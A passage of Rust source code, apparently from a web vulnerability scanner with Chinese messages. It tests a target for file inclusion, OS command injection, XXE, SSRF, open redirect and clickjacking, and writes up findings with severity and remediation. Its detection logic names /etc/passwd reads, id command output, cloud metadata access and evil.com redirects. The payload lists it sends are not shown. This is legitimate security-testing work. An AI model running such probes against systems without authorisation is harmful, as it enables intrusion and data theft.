                && !baseline_body.contains("root:"))
                || (body.contains("[extensions]")
                    && body.contains("[fonts]")
                    && !baseline_body.contains("[extensions]"))
                || (body.contains("PD9waH") && body.len() > baseline_body.len())
                || (body_lower.contains("no such file") && status == 200)
                || (body_lower.contains("failed to open stream") && status == 200)
                || (body_lower.contains("warning: include") && status == 200)
                || (body_lower.contains("warning: require") && status == 200);

            if is_lfi {
                let evidence = if body.contains("root:") {
                    format!(
                        "LFI 确认: /etc/passwd 内容泄露 (HTTP {})",
                        status
                    )
                } else if body.contains("[extensions]") {
                    format!("LFI 确认: Windows win.ini 内容泄露 (HTTP {})", status)
                } else {
                    format!(
                        "LFI 疑似: 响应包含文件路径错误信息 (HTTP {})",
                        status
                    )
                };

                lfi_findings.push(VulnFinding {
                    vuln_type: "lfi".to_string(),
                    name: "本地文件包含漏洞 (LFI)".to_string(),
                    severity: Severity::High,
                    description: format!(
                        "参数 '{}' 存在本地文件包含漏洞。攻击者可通过构造恶意输入读取服务器上的敏感文件，\
                         如 /etc/passwd、配置文件、源代码等，可能导致信息泄露、权限提升等严重后果。",
                        param
                    ),
                    evidence: format!("{} | Payload: {}", evidence, payload),
                    remediation: "对用户输入进行严格的白名单验证。使用绝对路径映射，禁止目录遍历字符。\
                        使用 open_basedir 限制可访问目录。避免直接将用户输入用于文件包含操作。"
                        .to_string(),
                    target_url: url.to_string(),
                    affected_param: Some(param.to_string()),
                    method: Some(method.to_string()),
                    cve: None,
                    cvss: Some(7.5),
                });
                break;
            }
        }

        delay(config.delay_ms);
    }

    // RFI 检测（简化：检测响应是否包含远程内容特征）
    for payload in RFI_PAYLOADS {
        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, config.timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), payload.to_string());
                send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
            }
        };

        if let Ok((status, body, _, _)) = result {
            let body_lower = body.to_lowercase();

            // RFI 特征: 响应中出现远程 URL 的内容特征，或 PHP 错误提示
            let is_rfi = (body_lower.contains("failed to open stream: http") && status == 200)
                || (body_lower.contains("warning: include") && body_lower.contains("http"))
                || (body_lower.contains("allow_url_include") && status == 200);

            if is_rfi {
                rfi_findings.push(VulnFinding {
                    vuln_type: "rfi".to_string(),
                    name: "远程文件包含漏洞 (RFI)".to_string(),
                    severity: Severity::Critical,
                    description: format!(
                        "参数 '{}' 存在远程文件包含漏洞。攻击者可包含远程服务器上的恶意脚本，\
                         直接在目标服务器上执行任意代码，完全控制服务器。",
                        param
                    ),
                    evidence: format!("HTTP {} | Payload: {}", status, payload),
                    remediation: "将 php.ini 中的 allow_url_include 设置为 Off。\
                        对用户输入进行严格的白名单验证。使用绝对路径和固定文件名映射。"
                        .to_string(),
                    target_url: url.to_string(),
                    affected_param: Some(param.to_string()),
                    method: Some(method.to_string()),
                    cve: None,
                    cvss: Some(9.8),
                });
                break;
            }
        }

        delay(config.delay_ms);
    }

    FileIncludeResult {
        target_url: url.to_string(),
        param: param.to_string(),
        total_payloads: (LFI_PAYLOADS.len() + RFI_PAYLOADS.len()) as u32,
        lfi_findings,
        rfi_findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// 命令注入扫描
// ============================================================================

fn do_scan_command_injection(
    url: &str,
    param: &str,
    config: &VulnScanConfig,
) -> CommandInjectionResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");
    let method = config.method.as_deref().unwrap_or("GET");

    let mut findings = Vec::new();

    // 基线响应时间
    let baseline_time = match method.to_uppercase().as_str() {
        "GET" => match send_get(url, cookies, headers, config.timeout_ms, user_agent) {
            Ok((_, _, _, t)) => t,
            Err(_) => 0,
        },
        _ => {
            let mut params = HashMap::new();
            params.insert(param.to_string(), "baseline".to_string());
            match send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent) {
                Ok((_, _, _, t)) => t,
                Err(_) => 0,
            }
        }
    };

    delay(config.delay_ms);

    // 基于内容的命令注入检测（Linux/Windows 混合 payload）
    let all_payloads: Vec<&str> = CMD_INJECTION_LINUX
        .iter()
        .chain(CMD_INJECTION_WINDOWS.iter())
        .copied()
        .collect();

    for payload in &all_payloads {
        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, config.timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), payload.to_string());
                send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
            }
        };

        if let Ok((status, body, _, _)) = result {
            let body_lower = body.to_lowercase();

            // 命令执行成功特征
            let is_cmd_injection = (body.contains("uid=") && body.contains("gid=")) // id 命令输出
                || (body.contains("root:") && body.contains(":0:0:")) // cat /etc/passwd
                || (body.contains("Windows IP") || body.contains("Windows IP 配置")) // ipconfig
                || (body.contains(" 驱动器 ") && body.contains(" 的卷")) // dir
                || (body_lower.contains("command not found") && status == 200)
                || (body_lower.contains("' is not recognized") && status == 200)
                || (body_lower.contains("syntax error") && status == 200);

            if is_cmd_injection {
                findings.push(VulnFinding {
                    vuln_type: "command_injection".to_string(),
                    name: "OS 命令注入漏洞".to_string(),
                    severity: Severity::Critical,
                    description: format!(
                        "参数 '{}' 存在操作系统命令注入漏洞。攻击者可注入任意系统命令，\
                         完全控制目标服务器，执行读取文件、写入后门、反弹 Shell 等操作。",
                        param
                    ),
                    evidence: format!("Payload: {} | HTTP {} | 响应包含命令执行特征", payload, status),
                    remediation: "避免将用户输入拼接到系统命令中。使用参数化的系统调用 API。\
                        对用户输入进行严格的白名单验证。以最小权限运行应用程序。\
                        使用 Web 应用防火墙 (WAF) 作为额外防护。"
                        .to_string(),
                    target_url: url.to_string(),
                    affected_param: Some(param.to_string()),
                    method: Some(method.to_string()),
                    cve: None,
                    cvss: Some(9.8),
                });
                break;
            }
        }

        delay(config.delay_ms);
    }

    // 基于时间的盲注检测（如果前面没发现）
    if findings.is_empty() && baseline_time > 0 {
        for payload in CMD_BLIND_TIME_PAYLOADS {
            let result = match method.to_uppercase().as_str() {
                "GET" => {
                    let test_url = match inject_url_param(url, param, payload) {
                        Ok(u) => u,
                        Err(_) => continue,
                    };
                    send_get(&test_url, cookies, headers, config.timeout_ms + 5000, user_agent)
                }
                _ => {
                    let mut params = HashMap::new();
                    params.insert(param.to_string(), payload.to_string());
                    send_post_form(url, &params, cookies, headers, config.timeout_ms + 5000, user_agent)
                }
            };

            if let Ok((_, _, _, resp_time)) = result {
                // 如果响应时间显著增加（超过基线 + 3 秒），可能存在时间盲注
                if resp_time > baseline_time + 3000 && resp_time > 4000 {
                    findings.push(VulnFinding {
                        vuln_type: "command_injection_blind".to_string(),
                        name: "OS 命令注入漏洞（时间盲注）".to_string(),
                        severity: Severity::Critical,
                        description: format!(
                            "参数 '{}' 疑似存在基于时间的命令注入盲注漏洞。\
                             注入延迟命令后响应时间显著增加，表明服务器可能执行了注入的系统命令。",
                            param
                        ),
                        evidence: format!(
                            "基线响应时间: {}ms, 注入后响应时间: {}ms | Payload: {}",
                            baseline_time, resp_time, payload
                        ),
                        remediation: "避免将用户输入拼接到系统命令中。使用参数化 API。\
                            对用户输入进行严格的白名单验证。"
                            .to_string(),
                        target_url: url.to_string(),
                        affected_param: Some(param.to_string()),
                        method: Some(method.to_string()),
                        cve: None,
                        cvss: Some(9.1),
                    });
                    break;
                }
            }

            delay(config.delay_ms);
        }
    }

    CommandInjectionResult {
        target_url: url.to_string(),
        param: param.to_string(),
        total_payloads: (all_payloads.len() + CMD_BLIND_TIME_PAYLOADS.len()) as u32,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// XXE 扫描
// ============================================================================

fn do_scan_xxe(url: &str, config: &VulnScanConfig) -> XxeScanResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");

    let mut findings = Vec::new();

    for (idx, payload) in XXE_PAYLOADS.iter().enumerate() {
        let result = send_post_raw(
            url,
            payload,
            "application/xml",
            cookies,
            headers,
            config.timeout_ms,
            user_agent,
        );

        match result {
            Ok((status, body, _, _)) => {
                let body_lower = body.to_lowercase();

                let is_xxe = (body.contains("root:") && body.contains(":0:0:")) // /etc/passwd 内容
                    || (body.contains("[extensions]") && body.contains("[fonts]")) // win.ini
                    || (body_lower.contains("entity") && body_lower.contains("not defined") && status == 500)
                    || (body_lower.contains("doctype") && body_lower.contains("parse error"))
                    || (body_lower.contains("xml parsing error") && status == 500)
                    || (body_lower.contains("external entity") && status == 200)
                    || (status == 200 && body.len() > 1000 && idx == 0 && body.contains("root:"));

                if is_xxe {
                    let mut severity = Severity::High;
                    if body.contains("root:") || body.contains("[extensions]") {
                        severity = Severity::Critical;
                    }

                    findings.push(VulnFinding {
                        vuln_type: "xxe".to_string(),
                        name: "XML 外部实体注入漏洞 (XXE)".to_string(),
                        severity,
                        description: "目标接口存在 XML 外部实体注入漏洞。攻击者可通过构造恶意 XML 数据，\
                            读取服务器本地文件、发起 SSRF 攻击、执行命令（特定环境下）等。"
                            .to_string(),
                        evidence: format!(
                            "Payload #{}, HTTP {} | 响应包含 XXE 特征: {}",
                            idx + 1,
                            status,
                            if body.contains("root:") {
                                "/etc/passwd 文件内容泄露"
                            } else if body.contains("[extensions]") {
                                "Windows win.ini 内容泄露"
                            } else {
                                "XML 解析错误/实体处理特征"
                            }
                        ),
                        remediation: "禁用 XML 外部实体解析（禁用 DTD）。使用安全的 XML 解析库配置。\
                            更新 XML 处理库到最新版本。实施白名单输入验证。"
                            .to_string(),
                        target_url: url.to_string(),
                        affected_param: None,
                        method: Some("POST".to_string()),
                        cve: None,
                        cvss: Some(8.1),
                    });
                    break;
                }
            }
            Err(_) => continue,
        }

        delay(config.delay_ms);
    }

    XxeScanResult {
        target_url: url.to_string(),
        total_payloads: XXE_PAYLOADS.len() as u32,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// SSRF 扫描
// ============================================================================

fn do_scan_ssrf(url: &str, param: &str, config: &VulnScanConfig) -> SsrfScanResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");
    let method = config.method.as_deref().unwrap_or("GET");

    let mut findings = Vec::new();
    let mut baseline_status = 200;
    let mut baseline_len = 0;

    // 基线
    if let Ok((s, body, _, _)) = match method.to_uppercase().as_str() {
        "GET" => send_get(url, cookies, headers, config.timeout_ms, user_agent),
        _ => {
            let mut params = HashMap::new();
            params.insert(param.to_string(), "https://example.com".to_string());
            send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
        }
    } {
        baseline_status = s;
        baseline_len = body.len();
    }

    delay(config.delay_ms);

    for payload in SSRF_PAYLOADS {
        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, config.timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), payload.to_string());
                send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
            }
        };

        if let Ok((status, body, _, resp_time)) = result {
            // SSRF 判定逻辑：
            // 1. 响应状态与基线显著不同
            // 2. 响应内容包含内网服务特征
            // 3. 响应时间异常（快速失败或内网服务响应）
            let body_lower = body.to_lowercase();
            let body_len = body.len();

            let has_internal_feature = body_lower.contains("localhost")
                || body_lower.contains("127.0.0.1")
                || body_lower.contains("meta-data")
                || body_lower.contains("ami-id")
                || body_lower.contains("redis_version")
                || body_lower.contains("<title>apache")
                || body_lower.contains("nginx")
                || (body_lower.contains("connection refused") && status == 500)
                || (body_lower.contains("拒绝连接") && status == 500);

            let is_status_different = status != baseline_status;
            let is_length_different = (body_len as i64 - baseline_len as i64).abs() > 500;

            if has_internal_feature || (is_status_different && is_length_different && payload.contains("127.0.0.1")) {
                let severity = if payload.contains("169.254.169.254") && status == 200 {
                    Severity::Critical
                } else if payload.contains("127.0.0.1") && status == 200 {
                    Severity::High
                } else {
                    Severity::Medium
                };

                let cvss_score = if severity == Severity::Critical {
                    9.8
                } else {
                    7.5
                };
                let is_critical = severity == Severity::Critical;

                findings.push(VulnFinding {
                    vuln_type: "ssrf".to_string(),
                    name: "服务端请求伪造漏洞 (SSRF)".to_string(),
                    severity,
                    description: format!(
                        "参数 '{}' 存在服务端请求伪造漏洞。攻击者可利用该漏洞探测内网、访问云平台元数据、\
                         攻击内网服务（如 Redis、数据库），甚至获取服务器权限。",
                        param
                    ),
                    evidence: format!(
                        "Payload: {} | HTTP {} | 响应长度: {} (基线: {}) | 响应时间: {}ms",
                        payload, status, body_len, baseline_len, resp_time
                    ),
                    remediation: "对用户提供的 URL 进行严格的白名单验证。\
                        禁止访问内网 IP 段和云平台元数据地址。\
                        使用独立的网络隔离环境发起外部请求。\
                        禁用不必要的 URL scheme（如 file://、dict://、gopher://）。"
                        .to_string(),
                    target_url: url.to_string(),
                    affected_param: Some(param.to_string()),
                    method: Some(method.to_string()),
                    cve: None,
                    cvss: Some(cvss_score),
                });

                // 高危发现后停止进一步测试
                if is_critical {
                    break;
                }
            }
        }

        delay(config.delay_ms);
    }

    // 添加 DNS Rebinding 提示
    if !findings.is_empty() {
        findings.push(VulnFinding {
            vuln_type: "ssrf_dns_rebinding".to_string(),
            name: "SSRF DNS Rebinding 风险提示".to_string(),
            severity: Severity::Info,
            description: "如果目标仅通过域名白名单或 DNS 解析后的 IP 校验来防止 SSRF，可能存在 DNS Rebinding 风险。\
                攻击者可通过 DNS Rebinding 技术绕过 IP 白名单访问内网。"
                .to_string(),
            evidence: "检测到 SSRF 漏洞，建议同时评估 DNS Rebinding 攻击面".to_string(),
            remediation: "使用网络层防护（防火墙、安全组）限制服务端可访问的 IP 范围。\
                对 DNS 解析结果进行校验并缓存，避免多次解析导致的绕过。\
                使用白名单域名时确保解析过程安全可靠。"
                .to_string(),
            target_url: url.to_string(),
            affected_param: Some(param.to_string()),
            method: Some(method.to_string()),
            cve: None,
            cvss: None,
        });
    }

    SsrfScanResult {
        target_url: url.to_string(),
        param: param.to_string(),
        total_payloads: SSRF_PAYLOADS.len() as u32,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// 开放重定向扫描
// ============================================================================

fn do_scan_open_redirect(
    url: &str,
    param: &str,
    config: &VulnScanConfig,
) -> OpenRedirectResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");
    let method = config.method.as_deref().unwrap_or("GET");

    let mut findings = Vec::new();

    for payload in OPEN_REDIRECT_PAYLOADS {
        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, config.timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), payload.to_string());
                send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
            }
        };

        if let Ok((status, _, resp_headers, _)) = result {
            // 检查 Location 头
            let location = resp_headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case("location"))
                .map(|(_, v)| v.clone());

            if let Some(loc) = location {
                let loc_lower = loc.to_lowercase();
                // 检查是否跳转到了恶意域名
                let is_open_redirect = (status == 301 || status == 302 || status == 303 || status == 307 || status == 308)
                    && (loc_lower.contains("evil.com")
                        || loc_lower.contains("javascript:")
                        || loc_lower.contains("data:text/html"));

                if is_open_redirect {
                    let severity = if loc_lower.contains("javascript:") || loc_lower.contains("data:") {
                        Severity::Medium
                    } else {
                        Severity::Low
                    };

                    findings.push(VulnFinding {
                        vuln_type: "open_redirect".to_string(),
                        name: "开放重定向漏洞".to_string(),
                        severity,
                        description: format!(
                            "参数 '{}' 存在开放重定向漏洞。攻击者可利用该漏洞将用户重定向到恶意网站，\
                             进行钓鱼攻击、窃取用户凭证等。",
                            param
                        ),
                        evidence: format!("Payload: {} | HTTP {} | Location: {}", payload, status, loc),
                        remediation: "对跳转目标 URL 进行严格的白名单验证（仅允许跳转到信任域名）。\
                            避免直接使用用户输入作为跳转目标。\
                            使用间接跳转映射（如 id 到 URL 的映射）。"
                            .to_string(),
                        target_url: url.to_string(),
                        affected_param: Some(param.to_string()),
                        method: Some(method.to_string()),
                        cve: None,
                        cvss: Some(3.1),
                    });
                    break;
                }
            }
        }

        delay(config.delay_ms);
    }

    OpenRedirectResult {
        target_url: url.to_string(),
        param: param.to_string(),
        total_payloads: OPEN_REDIRECT_PAYLOADS.len() as u32,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// 点击劫持扫描
// ============================================================================

fn do_scan_clickjacking(url: &str, config: &VulnScanConfig) -> ClickjackingResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");

    let (status, body, resp_headers, _) = match send_get(url, cookies, headers, config.timeout_ms, user_agent) {
        Ok(r) => r,
        Err(e) => {
            return ClickjackingResult {
                target_url: url.to_string(),
                x_frame_options: None,
                csp_frame_ancestors: None,
                is_vulnerable: false,
                findings: vec![VulnFinding {
                    vuln_type: "scan_error".to_string(),
                    name: "扫描失败".to_string(),
                    severity: Severity::Info,
                    description: e.clone(),
                    evidence: e,
                    remediation: String::new(),
                    target_url: url.to_string(),
                    affected_param: None,
                    method: None,
                    cve: None,
                    cvss: None,
                }],
                duration_ms: start.elapsed().as_millis() as u64,
            };
        }
    };

    let x_frame_options = resp_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("x-frame-options"))
        .map(|(_, v)| v.clone());

    let csp = resp_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-security-policy"))
        .map(|(_, v)| v.clone());

    let csp_frame_ancestors = csp.as_ref().and_then(|c| {
        let lower = c.to_lowercase();
        if lower.contains("frame-ancestors") {
            // 提取 frame-ancestors 指令的值
            for part in c.split(';') {
                let trimmed = part.trim();
                if trimmed.to_lowercase().starts_with("frame-ancestors") {
                    return Some(trimmed.to_string());
                }
            }
            Some("frame-ancestors 存在".to_string())
        } else {
            None
        }
    });

    let mut findings = Vec::new();
    let is_vulnerable = x_frame_options.is_none() && csp_frame_ancestors.is_none();

    if is_vulnerable {
        // 检查页面中是否有 frame-busting 脚本
        let body_lower = body.to_lowercase();
        let has_frame_busting = body_lower.contains("if (top.location")
            || body_lower.contains("if(top.location")
            || body_lower.contains("top.location != self.location")
            || body_lower.contains("window.top != window.self");

        findings.push(VulnFinding {
            vuln_type: "clickjacking".to_string(),
            name: "点击劫持漏洞".to_string(),
            severity: if has_frame_busting {
                Severity::Low
            } else {
                Severity::Medium
            },
            description: "页面缺少 X-Frame-Options 和 Content-Security-Policy frame-ancestors 防护头，\
                可能存在点击劫持（Clickjacking）风险。攻击者可通过 iframe 嵌入目标页面，\
                诱导用户点击执行非预期操作。"
                .to_string(),
            evidence: format!(
                "X-Frame-Options: {} | CSP frame-ancestors: {} | HTTP {}",
                x_frame_options.as_deref().unwrap_or("未设置"),
                csp_frame_ancestors.as_deref().unwrap_or("未设置"),
                status
            ),
            remediation: "设置 X-Frame-Options: DENY 或 SAMEORIGIN 响应头。\
                设置 Content-Security-Policy: frame-ancestors 'self' 响应头。\
                对敏感操作增加二次确认或验证码。"
                .to_string(),
            target_url: url.to_string(),
            affected_param: None,
            method: Some("GET".to_string()),
            cve: None,
            cvss: if has_frame_busting {
                Some(2.6)
            } else {
                Some(4.3)
            },
        });

        if has_frame_busting {
            findings.push(VulnFinding {
                vuln_type: "clickjacking_frame_busting".to_string(),
                name: "Frame Busting 脚本检测".to_string(),
                severity: Severity::Info,
                description: "检测到页面包含 frame-busting（防嵌套）脚本，但这不能完全替代 HTTP 头防护，\
                    因为脚本可能被绕过。"
                    .to_string(),
                evidence: "页面 JavaScript 中检测到 frame-busting 代码模式".to_string(),
                remediation: "使用 X-Frame-Options 和 CSP frame-ancestors 作为主要防护手段，\
                    frame-busting 脚本仅作为补充。"
                    .to_string(),
                target_url: url.to_string(),
                affected_param: None,
                method: Some("GET".to_string()),
                cve: None,
                cvss: None,
            });
        }
    }

    ClickjackingResult {
        target_url: url.to_string(),
        x_frame_options,
        csp_frame_ancestors,
        is_vulnerable,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// 综合扫描
// ============================================================================

/// 综合漏洞扫描
fn do_scan_all(url: &str, config: &VulnScanConfig) -> VulnScanReport {
    let start = Instant::now();
    let param = config.test_param.as_deref().unwrap_or("q");
    let method = config.method.as_deref().unwrap_or("GET");
    let scan_types = &config.scan_types;

    let mut all_findings: Vec<VulnFinding> = Vec::new();
    let mut actual_types = Vec::new();

    let should_scan = |t: &str| -> bool {
        scan_types.iter().any(|s| s == "all" || s.eq_ignore_ascii_case(t))
    };

    // XSS
    if should_scan("xss") {
        actual_types.push("xss".to_string());
        let result = do_scan_xss(url, param, method, config);
        all_findings.extend(result.reflected_xss);
        all_findings.extend(result.stored_xss);
        all_findings.extend(result.dom_xss);
    }

    // CSRF
    if should_scan("csrf") {
        actual_types.push("csrf".to_string());
        let result = do_scan_csrf(url, config);
        all_findings.extend(result.findings);
    }

    // 文件包含
    if should_scan("file_include") {
        actual_types.push("file_include".to_string());
        let result = do_scan_file_include(url, param, config);
        all_findings.extend(result.lfi_findings);
        all_findings.extend(result.rfi_findings);
    }

    // 命令注入
    if should_scan("command_injection") {
        actual_types.push("command_injection".to_string());
        let result = do_scan_command_injection(url, param, config);
        all_findings.extend(result.findings);
    }

    // XXE
    if should_scan("xxe") {
        actual_types.push("xxe".to_string());
        let result = do_scan_xxe(url, config);
        all_findings.extend(result.findings);
    }

    // SSRF
    if should_scan("ssrf") {
        actual_types.push("ssrf".to_string());
        let result = do_scan_ssrf(url, param, config);
        all_findings.extend(result.findings);
    }

    // 开放重定向
    if should_scan("open_redirect") {
        actual_types.push("open_redirect".to_string());
        let result = do_scan_open_redirect(url, param, config);
        all_findings.extend(result.findings);
    }

    // 点击劫持
    if should_scan("clickjacking") {
        actual_types.push("clickjacking".to_string());
        let result = do_scan_clickjacking(url, config);
        all_findings.extend(result.findings);
    }

    // 统计各等级数量
    let mut critical_count = 0;
    let mut high_count = 0;
    let mut medium_count = 0;
    let mut low_count = 0;
    let mut info_count = 0;

    for f in &all_findings {
        match f.severity {
            Severity::Critical => critical_count += 1,
            Severity::High => high_count += 1,
            Severity::Medium => medium_count += 1,
            Severity::Low => low_count += 1,
            Severity::Info => info_count += 1,
        }
    }

    // 按严重等级排序
    all_findings.sort_by(|a, b| a.severity.cmp(&b.severity).reverse());

    VulnScanReport {
        target_url: url.to_string(),
        scan_types: actual_types,
        total_vulns: all_findings.len() as u32,
        critical_count,
        high_count,
        medium_count,
        low_count,
        info_count,
        findings: all_findings,
        scan_time: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        duration_ms: start.elapsed().as_millis() as u64,
        scanner_version: "NETON VulnScanner 1.0".to_string(),
    }
}

// ============================================================================
// 公共 API 函数
// ============================================================================

/// 综合漏洞扫描
pub fn scan_vulnerabilities(url: String, config: VulnScanConfig) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let report = do_scan_all(&url, &config);
    serde_json::to_string_pretty(&report).map_err(|e| format!("序列化失败: {}", e))
}

/// XSS 漏洞扫描
pub fn scan_xss(url: String, param: String, method: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_xss(&url, &param, &method, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// CSRF 漏洞扫描
pub fn scan_csrf(url: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_csrf(&url, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// 文件包含漏洞扫描
pub fn scan_file_include(url: String, param: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_file_include(&url, &param, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// 命令注入漏洞扫描
pub fn scan_command_injection(url: String, param: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_command_injection(&url, &param, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// XXE 漏洞扫描
pub fn scan_xxe(url: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_xxe(&url, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// SSRF 漏洞扫描
pub fn scan_ssrf(url: String, param: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_ssrf(&url, &param, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// 开放重定向漏洞扫描
pub fn scan_open_redirect(url: String, param: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_open_redirect(&url, &param, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

/// 点击劫持检测
pub fn scan_clickjacking(url: String) -> Result<String, String> {
    if url.is_empty() {
        return Err("目标 URL 不能为空".to_string());
    }

    let config = VulnScanConfig {
        target_url: url.clone(),
        ..Default::default()
    };

    let result = do_scan_clickjacking(&url, &config);
    serde_json::to_string_pretty(&result).map_err(|e| format!("序列化失败: {}", e))
}

// ============================================================
// 兼容层：commands_netsec.rs 中使用的函数名别名
// ============================================================

pub fn scan_all(url: String, deep: bool) -> Result<String, String> {
    let scan_types = if deep {
        vec![
            "xss".to_string(),
            "csrf".to_string(),
            "file_include".to_string(),
            "command_injection".to_string(),
            "xxe".to_string(),
            "ssrf".to_string(),
            "open_redirect".to_string(),
            "clickjacking".to_string(),
        ]
    } else {
        vec![
            "xss".to_string(),
            "csrf".to_string(),
            "clickjacking".to_string(),
        ]
    };

    let config = VulnScanConfig {
        target_url: url.clone(),
        scan_types,
        depth: if deep { 3 } else { 1 },
        ..Default::default()
    };
    scan_vulnerabilities(url, config)
}

pub fn scan_cmd_injection(url: String, param: String) -> Result<String, String> {
    scan_command_injection(url, param)
}
